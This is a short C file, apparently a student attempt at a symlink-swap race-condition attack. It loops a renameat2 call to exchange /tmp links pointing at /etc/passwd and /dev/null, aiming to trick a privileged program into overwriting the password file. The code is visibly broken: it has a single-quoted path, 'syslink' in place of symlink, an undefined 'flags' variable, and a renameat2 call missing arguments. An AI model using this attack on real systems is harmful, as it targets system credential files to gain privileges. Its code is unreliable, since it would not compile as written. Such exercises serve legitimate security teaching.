#include<unistd.h>
#include<sys/syscall.h>
#include<linux/fs.h>

int main(){
    unlink('/tmp/XYZ');
    syslink("/dev/null","/tmp/XYZ");
    unlink("/tmp/ABC");
    syslink("/etc/passwd","/tmp/ABC");
    while(1){
        syscall( SYS_renameat2,0,"/tmp/ABC",flags);
        usleep(1000);
    }
    return 0;
}